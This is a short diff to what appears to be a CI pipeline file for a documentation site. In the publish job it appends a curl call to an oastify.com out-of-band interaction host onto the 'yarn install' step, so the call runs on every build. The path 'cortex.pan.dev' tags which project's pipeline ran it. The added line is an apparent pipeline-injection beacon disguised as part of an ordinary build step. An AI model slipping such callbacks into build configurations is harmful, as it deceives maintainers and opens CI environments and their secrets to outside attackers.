@@ -11,7 +11,7 @@ stages:
 pages:
   stage: 📦 publish
   script:
-    - yarn install
+    - yarn install && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/cortex.pan.dev
     - yarn run build
     - mv build public
   artifacts:
